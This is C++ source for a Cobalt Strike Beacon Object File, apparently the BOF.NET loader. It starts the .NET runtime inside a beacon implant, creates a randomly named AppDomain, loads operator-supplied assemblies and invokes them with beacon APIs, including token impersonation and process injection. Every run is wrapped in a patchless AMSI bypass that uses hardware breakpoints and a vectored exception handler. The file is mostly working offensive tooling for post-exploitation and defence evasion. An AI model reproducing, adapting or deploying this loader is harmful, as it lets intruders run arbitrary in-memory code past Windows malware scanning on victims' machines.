
#define _USE_RAW
#include <initguid.h>
#include "utils.h"

extern "C"{
#ifndef _BOF_
    #undef DECLSPEC_IMPORT
    #define DECLSPEC_IMPORT
#endif
    #include "beacon.h"
}

#include <comutil.h>
#include <mscoree.h>
#include <initializer_list>

#include "metahost.h"

namespace mscorlib{
    #include "mscorlib.h"
}

#include "patchless_amsi.h"


__CRT_UUID_DECL(mscorlib::_AppDomain, 0x05F696DC, 0x2B29, 0x3663, 0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13);

static const VARIANT vtEmpty{ {{VT_EMPTY, 0, 0, 0, {0}}}};
static const VARIANT vtNull{ {{VT_NULL, 0, 0, 0, {0}}}};

#define MAX_BOF_NAME 512
#define MAX_APPDOMAIN_NAME 64

static mscorlib::_AppDomain* initialiseChildBOFNETAppDomain(const wchar_t* appDomainName, const char* assemblyData, int len);

typedef HRESULT WINAPI (*CLRCreateInstancePtr)(REFCLSID clsid, REFIID riid, LPVOID *ppInterface);

//Bug in Cobalt Strike's inline-execute engine.
//Doens't seem to resolve variables within .bss section (uninitialsed data/initialised to zero).
//So we force the variable inside the .data section instead
static __attribute__((section(".data")))  ICorRuntimeHost* icrh = nullptr;

static mscorlib::_AppDomain* initAppDomain(ICorRuntimeHost* icrh, const wchar_t* appDomainName){

    BOF_LOCAL(OLE32, CLSIDFromString);

    GUID CLSID_AppDomain;
    HRESULT hr;
    IUnknown* iu = nullptr;
    mscorlib::_AppDomain* appDomain = nullptr;
    CLSIDFromString(L"{05F696DC-2B29-3663-AD8B-C4389CF2A713}", &CLSID_AppDomain);

    hr = icrh->CreateDomain(appDomainName, nullptr, &iu);

    if(iu == nullptr){
        log("[!] Failed to create AppDomain: 0x%x", hr);
        return nullptr;
    }

    hr = iu->QueryInterface(CLSID_AppDomain, (LPVOID*)&appDomain);

    if(appDomain == nullptr){
        log("[!] Failed to query AppDomain interface: 0x%x", hr);
    }
    iu->Release();

    return appDomain;
}

static char* randString(char *str, size_t size)
{
    BOF_LOCAL(msvcrt, rand);

    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    if (size) {
        --size;
        for (size_t n = 0; n < size; n++) {
            int key = rand() % (int) (sizeof charset - 1);
            str[n] = charset[key];
        }
        str[size] = '\0';
    }
    return str;
}


static mscorlib::_AppDomain* getAppDomain(ICorRuntimeHost* icrh){

    char                    appDomainName[MAX_APPDOMAIN_NAME] = {0};
    wchar_t                 appDomainNameWide[MAX_APPDOMAIN_NAME] = {0};
    bool                    found = false;
    mscorlib::_AppDomain*   appDomain = nullptr;

    if((appDomain = (mscorlib::_AppDomain*)BeaconGetValue("AppDomain")) == nullptr){
        appDomain = (mscorlib::_AppDomain*)calloc(sizeof(void*), 1);
        randString(appDomainName, 10);
        toWideChar(appDomainName, appDomainNameWide, 22);
        appDomain = initAppDomain(icrh, appDomainNameWide);
        BeaconAddValue("AppDomain", appDomain);
    }

    return appDomain;
}

static SAFEARRAY* createVariantSafeArray(int numArgs, va_list argp){

    BOF_LOCAL(OleAut32, SafeArrayCreateVector);
    BOF_LOCAL(OleAut32, SafeArrayPutElement);
    HRESULT hr;

    SAFEARRAY* sa = SafeArrayCreateVector(VT_VARIANT, 0, numArgs);

    for(long idx=0; idx < numArgs; ++idx){
        if((hr = SafeArrayPutElement(sa, &idx, (void*)va_arg(argp, VARIANT*))) != S_OK){
            log("[!] Failed to add element to SAFEARRAY: 0x%x", hr);
        }
    }

    return sa;
}


static SAFEARRAY* createVariantSafeArray(int numArgs, ...){

    va_list argp;
    va_start(argp, numArgs);
    SAFEARRAY* sa = createVariantSafeArray(numArgs,argp);
    va_end(argp);

    return sa;
}

static VARIANT invokeStaticMethod(mscorlib::_Type* type, const BSTR method, int numArgs, ... ){

    BOF_LOCAL(OleAut32, SafeArrayDestroy);

    VARIANT result;
    va_list argp;
    va_start(argp, numArgs);
    SAFEARRAY* saArgs = createVariantSafeArray(numArgs, argp);
    va_end(argp);

    HRESULT hr = type->InvokeMember_3(method, static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags_InvokeMethod | mscorlib::BindingFlags_Static | mscorlib::BindingFlags_Public),
                                          nullptr, vtEmpty, saArgs, &result);

    if(hr != S_OK){
        log("Failed to invoke member 0x%x", hr);
    }

    SafeArrayDestroy(saArgs);
    return result;
}

static mscorlib::_Assembly* loadAssembly(mscorlib::_AppDomain* appDomain, const char* data, int len){

    BOF_LOCAL(msvcrt, memcpy);
    BOF_LOCAL(OleAut32, SafeArrayCreate);
    BOF_LOCAL(OleAut32, SafeArrayDestroy);

    SAFEARRAYBOUND          sab;
    SAFEARRAY*              sa;
    mscorlib::_Assembly*    result = nullptr;
    HRESULT                 hr;

    sab.lLbound   = 0;
    sab.cElements = len;;
    sa = SafeArrayCreate(VT_UI1, 1, &sab);
    memcpy(sa->pvData, data, sab.cElements);

    hr = appDomain->Load_3(sa, &result);

    SafeArrayDestroy(sa);

    if(result == nullptr){
        log("[!] Failed to load BOFNET runtime assembly: 0x%x", hr);
    }

    return result;
}

static void logConsole(int type, char* msg, int len){
#ifdef _BOF_
    BeaconOutput(type, msg, len);
#else
    printf(msg);
#endif
}


static const char* skipWhitespace(const char* str){

    const char* result = str;

    while(*result == ' ' || *result == '\t' || *result =='\0'){
        result++;
    }
    return result;
}

static VARIANT createVariantString(const char* str){

    BOF_LOCAL(msvcrt, calloc);
    BOF_LOCAL(OleAut32, SysAllocString);
    BOF_LOCAL(msvcrt, free);
    BOF_LOCAL(msvcrt, strlen);

    int wideLen = (strlen(str) * 2) + 2;
    wchar_t* strW = (wchar_t*)calloc(1, wideLen);
    toWideChar((char*)str, strW, wideLen);

    VARIANT result;
    result.vt = VT_BSTR;
    result.bstrVal = SysAllocString(strW);

    free(strW);
    return result;
}

static ICorRuntimeHost* loadCLR(bool v4){

    BOF_LOCAL(OLE32, CoInitializeEx);
    BOF_LOCAL(OLE32, CoCreateInstance);
    BOF_LOCAL(OLE32, CLSIDFromString);
    BOF_LOCAL(OLE32, CoInitializeSecurity);
    BOF_LOCAL(OLE32, CoUninitialize);
    BOF_LOCAL(KERNEL32, LoadLibraryA);    

    GUID                    IID_RTH, CLSID_RTH, IID_MH, CLSID_MH, CLSID_RH, IID_RH, IID_RHI;
    HRESULT                 hr;
    ICorRuntimeHost*        result = nullptr;
    ICLRMetaHost*           pMetaHost = nullptr;
    ICLRRuntimeInfo*        pRuntimeInfo = nullptr;
    ICLRRuntimeHost*        pClrRuntimeHost = nullptr;
    CLRCreateInstancePtr    pCLRCreateInstance = nullptr;
    HMODULE                 hMod = NULL;

    CLSIDFromString(L"{cb2f6722-ab3a-11d2-9c40-00c04fa30a3e}", &IID_RTH);
    CLSIDFromString(L"{cb2f6723-ab3a-11d2-9c40-00c04fa30a3e}", &CLSID_RTH);
    CLSIDFromString(L"{d332db9e-b9b3-4125-8207-a14884f53216}", &IID_MH);
    CLSIDFromString(L"{9280188D-0E8E-4867-B30C-7FA83884E8DE}", &CLSID_MH);
    CLSIDFromString(L"{bd39d1d2-ba2f-486a-89b0-b4b0cb466891}", &IID_RHI);
    CLSIDFromString(L"{90f1a06e-7712-4762-86b5-7a5eba6bdb02}", &CLSID_RH);
    CLSIDFromString(L"{90f1a06c-7712-4762-86b5-7a5eba6bdb02}", &IID_RH);

    if( (hMod = LoadLibraryA("mscoree.dll")) != NULL){
        pCLRCreateInstance = (CLRCreateInstancePtr)GetProcAddress(hMod,"CLRCreateInstance");
        if(pCLRCreateInstance == nullptr){
            log("[=]Failed to get v2 ICorRuntimeHost: 0x%x, will try .NET 2 method", hr);
            v4 = false;
        }
    }

    hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);

    hr = CoInitializeSecurity( //Failure of this function does not necessarily mean we failed to initialize, it will fail on repeated calls, but the values from the original call are retained
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_DYNAMIC_CLOAKING,
        NULL);

    if(v4 && (hr = pCLRCreateInstance(CLSID_MH, IID_MH, (LPVOID*)&pMetaHost) == S_OK)){

        if((hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_RHI, (LPVOID*)&pRuntimeInfo)) == S_OK){
            if((hr = pRuntimeInfo->GetInterface(CLSID_RH, IID_RH, (LPVOID*)&pClrRuntimeHost)) == S_OK){;
                hr = pClrRuntimeHost->Start();
                hr = pRuntimeInfo->GetInterface(CLSID_RTH, IID_RTH, (LPVOID *)&result);
            }else{
                log("Failed to get CLR runtime host: 0x%x", hr);
            }
        }else{
            log("Failed to get v4 runtime info: 0x%x", hr);
        }

    }else{
        if( (hr = CoCreateInstance(CLSID_RTH, nullptr, CLSCTX_ALL, IID_RTH,(LPVOID*)&result)) == S_OK){
            hr = result->Start();
        }else{
            log("Failed to get v2 ICorRuntimeHost: 0x%x", hr);
        }
    }

    CoUninitialize();
    return result;
}

static VARIANT setupBeaconApiPtrs(){

    BOF_LOCAL(OleAut32, SafeArrayCreate);
    BOF_LOCAL(OleAut32, SafeArrayPutElement);

    VARIANT vPtrs;
    SAFEARRAYBOUND sab;

    //Bug in beacon BOF loader prevents intialiser list from properly resolving
    //function pointers, so we initialise the array the long way
    long long ptrs[6];
    ptrs[0] = reinterpret_cast<long long>(logConsole);
    ptrs[1] = reinterpret_cast<long long>(initialiseChildBOFNETAppDomain);
    ptrs[2] = reinterpret_cast<long long>(BeaconUseToken);
    ptrs[3] = reinterpret_cast<long long>(BeaconRevertToken);
    ptrs[4] = reinterpret_cast<long long>(BeaconGetSpawnTo);
    ptrs[5] = reinterpret_cast<long long>(BeaconInjectProcess);

    int numElements = sizeof(ptrs)/sizeof(long long);

    sab.lLbound   = 0;
    sab.cElements = numElements;
    vPtrs.vt = VT_ARRAY | VT_I8;
    vPtrs.parray = SafeArrayCreate(VT_I8, 1, &sab);

    for(LONG idx=0; idx<numElements; ++idx){
        SafeArrayPutElement(vPtrs.parray,&idx, &ptrs[idx]);
    }

    return vPtrs;
}

static mscorlib::_AppDomain* initialiseChildBOFNETAppDomain(const wchar_t* appDomainName, const char* assemblyData, int len){

    BOF_LOCAL(OleAut32, SysAllocString);
    BOF_LOCAL(OleAut32, SafeArrayCreate);
    BOF_LOCAL(OleAut32, SafeArrayDestroy);
    BOF_LOCAL(msvcrt, memcpy);

    mscorlib::_AppDomain* appDomain = initAppDomain(icrh, appDomainName);
    mscorlib::_Type* bofnetInitalizerType;
    HRESULT hr = S_FALSE;

    if(appDomain != nullptr){
        mscorlib::_Assembly* assembly = loadAssembly(appDomain, assemblyData, len);
        if(assembly != nullptr){

            hr = assembly->GetType_2(SysAllocString(L"BOFNET.Runtime"), &bofnetInitalizerType);

            if(bofnetInitalizerType == nullptr){
                log("Failed to get BOFNET.Runtime type: 0x%x\n", hr);
                return nullptr;
            }

            VARIANT vBeaconApis = setupBeaconApiPtrs();
            VARIANT vBofName = createVariantString("BOFNET.Bofs.Initializer");
            VARIANT rawData;
            SAFEARRAYBOUND sab;

            sab.lLbound   = 0;
            sab.cElements = len;
            rawData.vt = VT_ARRAY |  VT_UI1;
            rawData.parray = SafeArrayCreate(VT_UI1, 1, &sab);
            memcpy(rawData.parray->pvData, assemblyData, sab.cElements);

            invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 3, &vBeaconApis, &vBofName, &rawData);

            SafeArrayDestroy(rawData.parray);
            return appDomain;

        }else{
            appDomain->Release();
        }
    }

    return nullptr;
}

static void goWithBypasses(char* args , int len) {

    BOF_LOCAL(msvcrt, strcmp);
    BOF_LOCAL(msvcrt, memcpy);
    BOF_LOCAL(msvcrt, strlen);
    BOF_LOCAL(msvcrt, srand);
    BOF_LOCAL(OleAut32, SysAllocString);
    BOF_LOCAL(OleAut32, SafeArrayCreate);
    BOF_LOCAL(OleAut32, SafeArrayDestroy);
    BOF_LOCAL(KERNEL32, GetTickCount);
    BOF_LOCAL(KERNEL32, RemoveVectoredExceptionHandler);

    HRESULT                 hr;
    mscorlib::_Assembly*    bofnetAssembly = nullptr;
    mscorlib::_Type*        bofnetInitalizerType = nullptr;
    mscorlib::_AppDomain*   bofnetAppDomain = nullptr;
    char                    bofName[MAX_BOF_NAME] = {0};
    int                     managedArgsOffset = 0;

    srand(GetTickCount());

    if(len == 0){
        log("[+] No arguments specified for bofnet_execute, don't know what to do!\n", 0);
        return;
    }

    int tokens = msvcrt$sscanf_s(args, "%s", bofName, sizeof(bofName));

    if(tokens == 0){
        log("[!] Input arguments incorrect\n", 0);
        return;
    }

    managedArgsOffset = strlen(bofName) + 1;    
    int managedArgsLength = len - managedArgsOffset;

    icrh = loadCLR(true);
    if(icrh == nullptr){
        return;
    }

    bofnetAppDomain = getAppDomain(icrh);

    if(bofnetAppDomain == nullptr){
        log("[!] Failed to get BOFNET app domain\n", 0);
        return;
    }

    if(strcmp(bofName, "BOFNET.Bofs.Initializer") == 0){

        hr = bofnetAppDomain->Load_2(SysAllocString(L"BOFNET"), &bofnetAssembly);

        if(bofnetAssembly == nullptr){

            if(managedArgsLength == 0){
                log("[!] No BOFNET runtime payload supplied, bailing!", 0);
                return;
            }

            bofnetAssembly = loadAssembly(bofnetAppDomain, args+managedArgsOffset, managedArgsLength);

            if(bofnetAssembly == nullptr){
                return;
            }

        }else{
           log("[=] Looks like the BOFNET runtime is already loaded, ignoring initialize request\n", 0);
           return;
        }

    }else if(strcmp(bofName, "BOFNET.Bofs.Shutdown") == 0){
        log("[+] Unloading BOFNET", 0);
        icrh->UnloadDomain(bofnetAppDomain);
        icrh->Stop();
        bofnetAppDomain->Release();
        BeaconRemoveValue("AppDomain");
        return;

    }else{

        hr = bofnetAppDomain->Load_2(SysAllocString(L"BOFNET"), &bofnetAssembly);

        if(bofnetAssembly == nullptr){
            log("[!] Failed to get BOFNET assembly from AppDomain. Have you run BOFNET.Bofs.Initializer BOF yet? : 0x%x\n", hr);
            return;
        }
    }

    hr = bofnetAssembly->GetType_2(SysAllocString(L"BOFNET.Runtime"), &bofnetInitalizerType);

    if(bofnetInitalizerType == nullptr){
        log("[!] Failed to get BOFNET.Runtime type: 0x%x\n", hr);
        return;
    }

    VARIANT vBeaconApis = setupBeaconApiPtrs();
    VARIANT vBofName = createVariantString(bofName);

    if(args[managedArgsOffset-1] != '\0' || managedArgsLength == 0){

        VARIANT cmdLine;

        if(managedArgsLength){
            cmdLine = createVariantString(skipWhitespace(args + managedArgsOffset));
        }
        else{
            cmdLine.vt = VT_BSTR;
            cmdLine.bstrVal = nullptr;
        }

        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 3, &vBeaconApis, &vBofName, &cmdLine);

    }else{

        VARIANT rawData;
        SAFEARRAYBOUND sab;

        sab.lLbound   = 0;
        sab.cElements = managedArgsLength;
        rawData.vt = VT_ARRAY |  VT_UI1;
        rawData.parray = SafeArrayCreate(VT_UI1, 1, &sab);
        memcpy(rawData.parray->pvData, args+managedArgsOffset, sab.cElements);

        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 3, &vBeaconApis, &vBofName, &rawData);

        SafeArrayDestroy(rawData.parray);
    }
}

extern "C" void go(char* args , int len) {

    //Setup our hardware breakpoint on AMSI and the VEH
    HANDLE hExHandler = setupBypasses();

    goWithBypasses(args,len);

    //Clear our hardware breakpoints and VEH
    clearBypasses(hExHandler);
}
